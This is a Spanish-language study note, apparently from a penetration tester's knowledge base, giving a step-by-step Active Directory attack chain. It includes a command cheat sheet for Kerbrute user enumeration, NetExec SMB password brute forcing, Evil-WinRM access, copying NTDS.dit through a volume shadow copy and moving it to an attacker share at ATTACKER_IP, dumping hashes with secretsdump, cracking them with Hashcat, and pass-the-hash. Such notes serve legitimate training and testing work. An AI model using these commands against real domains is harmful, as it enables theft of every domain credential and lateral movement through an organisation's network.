---
tags:
  - windows
  - AD
  - NTDS
---
## Conceptos Clave (TL;DR)

* Active Directory (AD) se utiliza para administrar sistemas Windows en redes empresariales; el objetivo debe ser accesible a través de la red, normalmente mediante un acceso inicial interno o un reenvío de puertos.

* Los sistemas unidos al dominio validan las solicitudes de inicio de sesión a través del controlador de dominio en lugar de la base de datos SAM local, aunque las cuentas locales de SAM siguen siendo accesibles usando el formato de nombre de host o `.\`.

* El archivo NTDS.dit es la base de datos principal de AD que almacena todos los nombres de usuario, hashes de contraseñas e información del esquema, y se ubica comúnmente en `%systemroot%/ntds`.

* Los hashes almacenados en NTDS.dit están cifrados; se requiere descargar tanto el archivo NTDS.dit como el archivo SYSTEM para lograr extraer los hashes exitosamente.

  
## Herramientas Clave

* **Username Anarchy**: Generador automatizado para convertir listas de nombres reales en formatos comunes de nombres de usuario.

* **Kerbrute**: Herramienta utilizada para la enumeración de usuarios, ataques de fuerza bruta y rociado de contraseñas (password spraying) mediante Kerberos.

* **[NetExec](../../../📂%2008%20Herramientas&Cheatsheets/NetExec.md)**: Herramienta multifuncional para lanzar ataques de fuerza bruta mediante SMB y para capturar automáticamente el archivo NTDS.dit usando VSS.

* **Evil-WinRM**: Establece sesiones remotas de PowerShell utilizando el servicio Windows Remote Management.

* **Impacket-secretsdump**: Extrae los hashes NTLM locales y de dominio a partir de los archivos NTDS.dit y SYSTEM.

* **[Hashcat](../../../📂%2008%20Herramientas&Cheatsheets/Hashcat.md)**: Permite intentar descifrar los hashes obtenidos utilizando diccionarios para encontrar contraseñas en texto claro.


## Metodología Paso a Paso

1. **Reconocimiento y Generación de Diccionarios**: El primer paso consiste en recopilar nombres de empleados mediante fuentes públicas y determinar la convención de nombres de usuario, como la estructura de las direcciones de correo electrónico.  Esto permite generar una lista de usuarios adaptada al objetivo, ya sea manualmente o usando Username Anarchy.

2. **Enumeración de Usuarios**: Para evitar bloqueos y optimizar el ataque, se valida la existencia de los nombres de usuario generados frente al controlador de dominio usando Kerbrute.

3. **Ataque de Fuerza Bruta / Diccionario**: Con una lista de usuarios válidos, se lanza un ataque de diccionario utilizando NetExec contra el protocolo SMB del controlador de dominio para adivinar contraseñas.

4. **Acceso Inicial y Verificación de Privilegios**: Al obtener credenciales válidas, se establece una sesión mediante Evil-WinRM.  Posteriormente, se verifican los privilegios del usuario para confirmar si posee derechos de administrador local o de administrador de dominio.

5. **Captura del archivo NTDS.dit**: Dado que el archivo NTDS.dit está en uso, se utiliza `vssadmin` para crear una instantánea de volumen (Volume Shadow Copy) de la unidad, lo que permite copiar el archivo sin interrumpir los servicios.  Alternativamente, este proceso se puede automatizar usando el módulo `ntdsutil` de NetExec.

6. **Extracción y Cracking de Hashes**: Una vez transferidos los archivos NTDS.dit y SYSTEM a la máquina atacante, se extraen los hashes utilizando secretsdump.  Luego, se intentan descifrar con Hashcat para obtener las contraseñas en texto claro.

7. **Pass-the-Hash (PtH)**: Si no es posible descifrar el hash, este se puede utilizar directamente como método de autenticación, aprovechando el protocolo NTLM para lograr movimiento lateral mediante herramientas como Evil-WinRM.

  

## Cheat Sheet de Comandos

```bash
# Generar lista de usuarios a partir de un archivo con nombres reales usando Username Anarchy

./username-anarchy -i <NAMES_FILE>
```

```bash
# Enumerar usuarios válidos en AD usando Kerbrute apuntando al Controlador de Dominio

./kerbrute userenum --dc <TARGET_IP> --domain <DOMAIN> <USER_LIST>
```

```bash
# Ejecutar ataque de diccionario por SMB con NetExec usando un usuario específico y un diccionario de contraseñas

netexec smb <TARGET_IP> -u <USER> -p <PASSWORD_LIST>
```

```bash
# Conectar al objetivo remotamente mediante Evil-WinRM con credenciales en texto claro

evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'
```

```powershell
# Revisar los grupos locales en el sistema comprometido para buscar privilegios de administrador

net localgroup
```

```powershell
# Verificar los detalles de la cuenta de usuario, incluyendo membresías en grupos de dominio

net user <USER>
```

```powershell
# Crear una instantánea de volumen (Volume Shadow Copy) de la unidad designada para copiar archivos en uso

vssadmin CREATE SHADOW /For=<TARGET_DRIVE>:
```

```powershell
# Copiar NTDS.dit desde la ruta de la instantánea generada (ajustar VolumeShadowCopyX según corresponda) a una carpeta temporal

cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\NTDS.dit c:\<TEMP_FOLDER>\NTDS.dit
```

```powershell
# Mover el archivo NTDS.dit capturado hacia un recurso compartido SMB en la máquina atacante

cmd.exe /c move C:\<TEMP_FOLDER>\NTDS.dit \\<ATTACKER_IP>\<SHARE_NAME>
```

```bash
# Extraer los hashes del archivo NTDS.dit en la máquina atacante usando Impacket (requiere también el archivo SYSTEM)

impacket-secretsdump -ntds <NTDS_FILE> -system <SYSTEM_FILE> LOCAL
```

```bash
# Alternativa rápida: Volcar NTDS.dit y extraer hashes automáticamente usando NetExec y el módulo ntdsutil

netexec smb <TARGET_IP> -u <USER> -p '<PASSWORD>' -M ntdsutil
```

```bash
# Intentar crackear un hash NTLM específico utilizando Hashcat y un diccionario

sudo hashcat -m 1000 <HASH> <WORDLIST>
```

```bash
# Ejecutar técnica Pass-the-Hash (PtH) mediante Evil-WinRM para autenticarse usando el hash NTLM en lugar de la contraseña

evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>
```

## "Gotchas" y Troubleshooting

* Los ataques de diccionario pueden ser ruidosos, generar alertas y causar bloqueos de cuentas si existen restricciones aplicadas mediante Políticas de Grupo (Group Policy).

* Algunas organizaciones intentan mitigar estos ataques ofuscando los nombres de usuario internos mediante alias (por ejemplo, asignar a907 en lugar de joe.smith).

* Para capturar el archivo NTDS.dit manualmente, es un requisito estricto poseer derechos de Administrador Local o de Administrador de Dominio (o equivalentes).

* Recuerda que los ataques dejan rastros; la validación de credenciales genera registros de seguridad en el Visor de Eventos de Windows bajo el Event ID 4776.

* Es indispensable tener una copia tanto del archivo NTDS.dit como del archivo SYSTEM para extraer credenciales, ya que la llave de descifrado reside en el archivo SYSTEM.